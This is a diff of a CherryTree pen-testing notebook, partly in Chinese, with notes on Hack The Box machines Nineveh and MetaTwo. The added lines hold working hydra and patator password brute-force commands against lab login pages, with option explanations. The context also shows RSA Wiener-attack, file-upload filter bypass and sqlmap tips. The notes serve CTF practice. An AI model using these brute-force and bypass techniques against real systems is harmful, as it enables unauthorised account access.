@@ -331,7 +331,7 @@ fs             0x0                 0
 gs             0x0                 0
 </codebox>
   </node>
-  <node name="hack_operation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649905004" ts_lastsave="1678091686">
+  <node name="hack_operation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649905004" ts_lastsave="1678118574">
     <rich_text>1. 生成 rsa private key 并解密加密的文件
 ./RsaCtfTool.py --publickey ~/Weak_RSA/key.pub --uncipherfile ~/Weak_RSA/flag.enc --attack wiener --private
 
@@ -458,7 +458,19 @@ lrwxrwxrwx 1 root root 4 Sep  1 22:11 /bin/sh -&gt; </rich_text>
 17. 在文件内容前加  GIF8; 用 file 命令查看文件，可以看出文件将被识别成 img 图片，对于图片上传检测绕过有用。还有后缀名绕过如 rev_shell.php.jpg。
 
 18. sqlmap 指定需要注入字段时，可用 -p id,name 。如果name="{"name":"abc"}",可用 * 来表示，如 name="{"name":"abc*"}"
-</rich_text>
+
+19: hydra -l admin -P pass.txt </rich_text>
+    <rich_text link="webs http://metapress.htb/wp-login.php">metapress.htb</rich_text>
+    <rich_text> http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&amp;testcookie=1:</rich_text>
+    <rich_text foreground="#eded33333b3b">incorrect</rich_text>
+    <rich_text>:</rich_text>
+    <rich_text foreground="#eded33333b3b">H=</rich_text>
+    <rich_text>Cookie\: PHPSESSID=l7ts8pn1umfr8519pgotlp4mlf; wordpress_test_cookie=WP%20Cookie%20check:</rich_text>
+    <rich_text foreground="#eded33333b3b">G= </rich_text>
+    <rich_text>" -t 64 -V
+incorrect	指登录失败需要筛选的字符，根据具体返回的页面内容添加
+H=  是指添加 header，需要放在错误字符筛选后添加
+G=	指不进行预先cookie请求，如果不加G= （后有个空格），每次进行post请求之前都会进行一次 get 请求获取 cookie 数据，然后放到 post 请求头中进行下一步请求</rich_text>
   </node>
   <node name="linux" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675223633" ts_lastsave="1677641160">
     <rich_text weight="heavy">Linux 最基本的操作</rich_text>
@@ -1186,7 +1198,7 @@ root: 1703b8a3c9a8dde879942c79d02fd3a0</rich_text>
     </node>
   </node>
   <node name="Nineveh" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649930488" ts_lastsave="1650421989">
-    <node name="Enumeration" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649930507" ts_lastsave="1650361572">
+    <node name="Enumeration" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649930507" ts_lastsave="1678123313">
       <rich_text>1. nmap -sV -sC -Pn 10.10.10.43
 Starting Nmap 7.92 ( </rich_text>
       <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
@@ -1226,6 +1238,17 @@ hydra -l none -P /root/gh_tools/SecLists/Passwords/Common-Credentials/10k-most-c
 [80][http-post-form] host: 10.10.10.43   login: none   password: </rich_text>
       <rich_text foreground="#eded33333b3b">1q2w3e4r5t</rich_text>
       <rich_text>
+
+patator http_fuzz proxy_type=http proxy=127.0.0.1:8080 url=</rich_text>
+      <rich_text link="webs http://10.0.0.1/phpmyadmin/index.php">http://10.</rich_text>
+      <rich_text>10.10.43/department/login.php method=POST body='username=admin&amp;password=FILE0' 0=pass.txt -x ignore:fgrep='Invalid'  -t 50
+
+patator http_fuzz url=http://10.10.10.43/department/login.php  method=POST body="username=admin&amp;password=FILE0" 0=pass.txt http_proxy=</rich_text>
+      <rich_text link="webs http://127.0.0.1:8080">http://127.0.0.1:8080</rich_text>
+      <rich_text>
+
+patator http_fuzz raw_request=req.txt 0=pass.txt
+
 
 4. hydra https login page
 hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect" -t 64 
@@ -4277,7 +4300,7 @@ end
          method_id: :resolve
 </codebox>
   </node>
-  <node name="MetaTwo" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678071809" ts_lastsave="1678110811">
+  <node name="MetaTwo" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678071809" ts_lastsave="1678118681">
     <rich_text>1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.186 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
 nmap -sC -sV -p $ports 10.10.11.186 -Pn
 Starting Nmap 7.93 ( </rich_text>
@@ -4346,15 +4369,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 admin
 
-hydra -l admin -P 10k-most-common.txt </rich_text>
+hydra -l admin -P pass.txt </rich_text>
     <rich_text link="webs http://metapress.htb/wp-login.php">metapress.htb</rich_text>
-    <rich_text> http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:H=User-Agent\:Mozilla/5.0 (X11; Linux x86_64; rv\:102.0) Gecko/20100101 Firefox/102.0:H=Accept\:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8:H=Origin\:</rich_text>
-    <rich_text link="webs http://metapress.htb">http\://metapress.htb</rich_text>
-    <rich_text>:H=Referer\:</rich_text>
-    <rich_text link="webs http://metapress.htb/wp-login.php">http\://metapress.htb/wp-login.php</rich_text>
-    <rich_text>:H=Upgrade-Insecure-Requests\:1:H=Cookie\:PHPSESSID=a83jpbg8tovuglvoe9bdd1vea5; wordpress_test_cookie=WP%20Cookie%20check:incorrect" -t 64 -V
+    <rich_text> http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&amp;testcookie=1:incorrect:H=Cookie\: PHPSESSID=l7ts8pn1umfr8519pgotlp4mlf; wordpress_test_cookie=WP%20Cookie%20check:G= " -t 64
 
 
+H=Cookie\: PHPSESSID=l7ts8pn1umfr8519pgotlp4mlf; wordpress_test_cookie=WP%20Cookie%20check
+
+Cookie: PHPSESSID=l7ts8pn1umfr8519pgotlp4mlf; wordpress_test_cookie=WP%20Cookie%20check
 
 POST /wp-login.php HTTP/1.1&#13;
 Host: metapress.htb&#13;
